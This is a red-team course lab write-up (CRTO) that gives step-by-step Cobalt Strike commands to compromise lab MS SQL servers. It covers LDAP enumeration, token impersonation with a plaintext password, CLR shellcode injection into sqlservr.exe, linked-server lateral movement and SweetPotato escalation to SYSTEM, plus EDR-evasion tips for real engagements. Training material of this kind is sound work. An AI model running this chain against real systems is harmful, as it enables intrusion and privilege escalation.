# CRTO — SQL Servers Lab

**Course:** Red Team Ops (CRTO) by RastaMouse — Zero Point Security
**Lab:** SQL Servers
**Objective:** Enumerate, gain code execution, move laterally via linked servers, and escalate privileges on MS SQL servers

---

## The Full Chain

```
ldapsearch → find MSSQL servers (MSSQLSvc SPNs) + SQL groups with sysadmin members
    ↓
sql-info / sql-whoami → confirm guest-only access as pchilds
    ↓
Impersonate rsteel (sysadmin on lon-db-1) → sql-whoami confirms elevated SQL privileges
    ↓
sql-enableclr → enable SQL CLR on lon-db-1
    ↓
Build MyProcedure.dll (CLR stored procedure → shellcode injection into SQL process)
    ↓
sql-clr → load DLL + execute stored procedure → SMB Beacon inside sqlservr.exe
    ↓
link lon-db-1 → connect to SMB Beacon via named pipe
    ↓
sql-disableclr → cleanup
    ↓
sql-links → enumerate linked servers → lon-db-2
    ↓
sql-enablerpc → enable RPC Out on link → sql-clr via lon-db-1 → lon-db-2
    ↓
link lon-db-2 from lon-db-1 Beacon → SMB Beacon on lon-db-2
    ↓
sql-disablerpc → cleanup
    ↓
whoami → SeImpersonatePrivilege Enabled on lon-db-2 service account
    ↓
Upload tcp-local_x64.exe → SweetPotato → SYSTEM Beacon on lon-db-2
    ↓
connect localhost 1337 → link to SYSTEM Beacon
```

---

## Phase 1 — Enumeration

### Find MSSQL Servers via LDAP

```bash
# Load SQL-BOF aggressor script first
# Cobalt Strike > Script Manager > C:\Tools\SQL-BOF\SQL\SQL.cna

# Find accounts with MSSQLSvc SPNs (Kerberos-auth SQL instances)
ldapsearch (&(samAccountType=805306368)(servicePrincipalName=MSSQLSvc*)) --attributes name,samAccountName,servicePrincipalName
```

> `samAccountType=805306368` = user accounts. SQL service accounts registered with Kerberos will have `MSSQLSvc/<host>:<port>` SPNs. This also identifies Kerberoastable SQL service accounts (cross-reference with Kerberoasting lab).

### Enumerate SQL Instance Info and Privileges

```bash
sql-info lon-db-1       # SQL version, auth mode, sysadmin flag
sql-whoami lon-db-1     # current login, role, privileges
```

> As `pchilds`: guest-level access only — not useful for code execution.

### Find SQL Admin Groups

```bash
ldapsearch (&(samAccountType=268435456)(|(name=*SQL*)(name=*DB*)(name=*Database*))) --attributes distinguishedName,member
```

> `samAccountType=268435456` = security groups. This finds groups like "DB Admins" or "SQL Admins" whose members likely have sysadmin roles on SQL instances. Cross-reference membership with accounts you can impersonate.

### Impersonate rsteel and Recheck

```bash
steal_token [rsteel_pid]    # or make_token CONTOSO\rsteel Passw0rd!
sql-whoami lon-db-1         # now shows sysadmin
```

**TTP:** T1078.002 — Valid Accounts: Domain Accounts

---

## Phase 2 — Code Execution via SQL CLR

**TTP:** T1059.001 — Command and Scripting Interpreter: PowerShell (SQL CLR is a .NET execution primitive)
**TTP:** T1055 — Process Injection (shellcode injected into sqlservr.exe)

### What SQL CLR Is

SQL Server's Common Language Runtime integration allows .NET assemblies to be loaded as **stored procedures** that execute inside the SQL Server process (`sqlservr.exe`). Abusing this gives code execution in the context of the SQL service account.

### Enable CLR

```bash
# Check current status
sql-query lon-db-1 "SELECT value FROM sys.configurations WHERE name = 'clr enabled'"
# Returns: 0 (disabled by default)

# Enable
sql-enableclr lon-db-1
```

### Generate SMB Beacon Shellcode

```
Payloads > Windows Stageless Payload
Listener:      smb
Output:        Raw
Exit Function: Thread
Save to:       C:\Payloads\smb_x64.xthread.bin
```

> **Exit Function: Thread** — Beacon runs inside `sqlservr.exe`. Using `Process` would kill SQL Server when Beacon exits. `Thread` exits cleanly without affecting the host process.

### Build MyProcedure.dll

```
Visual Studio → New Project → Class Library (.NET Framework)
Project name: MyProcedure
```

Add `smb_x64.xthread.bin` as embedded resource (Properties → Build Action: Embedded Resource).

**What the CLR stored procedure does:**

```csharp
1. Read embedded shellcode from assembly manifest resource
       ↓
2. VirtualAlloc(PAGE_EXECUTE_READWRITE) — allocate RWX memory
       ↓
3. WriteProcessMemory(-1, ...) — copy shellcode into allocated memory
       ↓
4. CreateThread(shellcode address) — execute shellcode in new thread
       ↓
5. CloseHandle(thread) — clean up handle
```

> **OPSEC note:** `PAGE_EXECUTE_READWRITE` is a significant IOC — RWX memory allocation is heavily monitored by EDRs. In the lab this works because the Artifact Kit and Malleable C2 profile handle evasion at the Beacon level. On real engagements, consider RW→RX transition or indirect syscalls for the injection.

Build in **Release** mode → `C:\Users\Attacker\source\repos\MyProcedure\bin\Release\MyProcedure.dll`

### Load and Execute CLR Payload

```bash
# Load DLL into lon-db-1 and execute MyProcedure stored procedure
sql-clr lon-db-1 C:\Users\Attacker\source\repos\MyProcedure\bin\Release\MyProcedure.dll MyProcedure
```

### Link to the SMB Beacon

```bash
link lon-db-1 TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337
```

> **If you get ERROR_LOGON_FAILURE:** The `link` command requires SMB authentication to lon-db-1. You need either:
> - A TGT or CIFS service ticket in the current Beacon session, **OR**
> - Run `link` from a Beacon that already has a valid TGT (e.g. pchilds' Beacon — Windows will auto-request a CIFS TGS)
>
> The named pipe (`TSVCPIPE-...`) must match your SMB listener config exactly.

### Cleanup CLR

```bash
sql-disableclr lon-db-1
```

> Always disable CLR after use — leaving it enabled is a detectable configuration change and violates *primum non nocere*.

---

## Phase 3 — Lateral Movement via SQL Links

SQL Server linked servers allow queries to be forwarded from one SQL instance to another — a built-in SQL lateral movement primitive.

### Enumerate Links

```bash
sql-links lon-db-1
# Returns: lon-db-2 (linked server)
```

### Check Privileges on Linked Server

```bash
sql-whoami lon-db-1 "" lon-db-2
# Third argument = linked server to proxy through
```

### Enable RPC Out (Required for CLR Execution)

```bash
# Check RPC Out status
sql-checkrpc lon-db-1

# Enable RPC Out on the link to lon-db-2
sql-enablerpc lon-db-1 lon-db-2
```

> **RPC Out** must be enabled on the linked server config to execute stored procedures (CLR) remotely. Without it, only queries can be forwarded — not procedure execution.

### Execute CLR Payload on lon-db-2 via lon-db-1

```bash
# Fourth argument = linked server target
sql-clr lon-db-1 C:\Users\Attacker\source\repos\MyProcedure\bin\Release\MyProcedure.dll MyProcedure "" lon-db-2
```

### Link to lon-db-2 Beacon (from lon-db-1 Beacon)

```bash
# From the lon-db-1 Beacon — lon-db-2 Beacon connects back through lon-db-1
link lon-db-2 TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337
```

### Cleanup RPC

```bash
sql-disablerpc lon-db-1 lon-db-2
```

---

## Phase 4 — Privilege Escalation via SweetPotato

**TTP:** T1134.002 — Access Token Manipulation: Create Process with Token
**TTP:** T1068 — Exploitation for Privilege Escalation

### Why This Works — SeImpersonatePrivilege

```bash
whoami    # on lon-db-2 Beacon
```

SQL Server service accounts run with `SeImpersonatePrivilege` enabled — a Windows privilege that allows a process to impersonate any authentication token presented to it. This is the prerequisite for all "Potato" attacks.

**Potato attack chain:**
```
SweetPotato triggers a privileged COM object authentication
    ↓
COM object authenticates to SweetPotato's fake server
    ↓
SweetPotato impersonates the SYSTEM token using SeImpersonatePrivilege
    ↓
Spawns our payload as SYSTEM
```

### Stage tcp-local Payload

```bash
# Generate payload
Payloads > Windows Stageless Payload
Listener:  tcp-local    (port 1337, localhost only)
Save to:   C:\Payloads\tcp-local_x64.exe

# Change to SQL service profile AppData directory (writable by service account)
cd C:\Windows\ServiceProfiles\MSSQLSERVER\AppData\Local\Microsoft\WindowsApps

# Upload
upload C:\Payloads\tcp-local_x64.exe
```

> **Why this directory:** Writable by the MSSQL service account. `C:\Temp` also works but this path is more consistent with legitimate SQL service file locations.

### Execute SweetPotato

```bash
execute-assembly C:\Tools\SweetPotato\bin\Release\SweetPotato.exe -p "C:\Windows\ServiceProfiles\MSSQLSERVER\AppData\Local\Microsoft\WindowsApps\tcp-local_x64.exe"
```

### Connect to SYSTEM Beacon

```bash
connect localhost 1337
```

> `tcp-local` listener binds to `127.0.0.1:1337` only — the `connect` command tells the parent Beacon to connect to the child Beacon on localhost. No external connection, no new network traffic.

---

## SQL-BOF Command Reference

| Command | Syntax | Purpose |
|---|---|---|
| `sql-info` | `sql-info <host>` | SQL version, auth mode, sysadmin status |
| `sql-whoami` | `sql-whoami <host> [link_user] [linked_host]` | Current login, role, privileges |
| `sql-query` | `sql-query <host> "<query>"` | Execute arbitrary SQL query |
| `sql-enableclr` | `sql-enableclr <host>` | Enable CLR integration |
| `sql-disableclr` | `sql-disableclr <host>` | Disable CLR integration |
| `sql-clr` | `sql-clr <host> <dll> <proc> [link_user] [linked_host]` | Load CLR assembly and execute stored procedure |
| `sql-links` | `sql-links <host>` | Enumerate linked servers |
| `sql-checkrpc` | `sql-checkrpc <host>` | Check RPC Out status on linked servers |
| `sql-enablerpc` | `sql-enablerpc <host> <linked_host>` | Enable RPC Out on link |
| `sql-disablerpc` | `sql-disablerpc <host> <linked_host>` | Disable RPC Out on link |

---

## MITRE ATT&CK Mapping

| TTP | Technique | Detail |
|---|---|---|
| T1505.001 | Server Software Component: SQL Stored Procedures | CLR stored procedure for shellcode execution |
| T1055 | Process Injection | Shellcode injected into sqlservr.exe via CLR |
| T1210 | Exploitation of Remote Services | SQL linked server lateral movement |
| T1134.002 | Access Token Manipulation: Create Process with Token | SweetPotato SeImpersonatePrivilege abuse |
| T1068 | Exploitation for Privilege Escalation | SweetPotato COM token impersonation |
| T1078.002 | Valid Accounts: Domain Accounts | Impersonate rsteel for sysadmin SQL access |

---

## Key Takeaways

- **SQL SPNs reveal SQL servers** — `MSSQLSvc*` ldapsearch finds all Kerberos-auth SQL instances and their Kerberoastable service accounts in one query
- **Group enumeration is the path to sysadmin** — find SQL/DB groups via LDAP, check membership, find an account you can impersonate
- **Exit Function: Thread** is mandatory for CLR DLLs injected into services — `Process` would kill SQL Server
- **CLR must be disabled after use** — always `sql-disableclr` as cleanup
- **RPC Out must be enabled** to execute stored procedures over linked servers — `sql-checkrpc` before attempting lateral movement
- **ERROR_LOGON_FAILURE on `link`** = missing CIFS service ticket — run from a Beacon with a valid TGT or manually request a CIFS TGS
- **SeImpersonatePrivilege on SQL service accounts** is nearly universal — assume SweetPotato will work whenever you land on a SQL server as the service account
- `tcp-local` listener (localhost-only port 1337) is specifically designed for local privesc payloads — `connect localhost 1337` chains the SYSTEM Beacon through the parent
- Always clean up: `sql-disableclr`, `sql-disablerpc`, delete uploaded payloads after SYSTEM Beacon is established
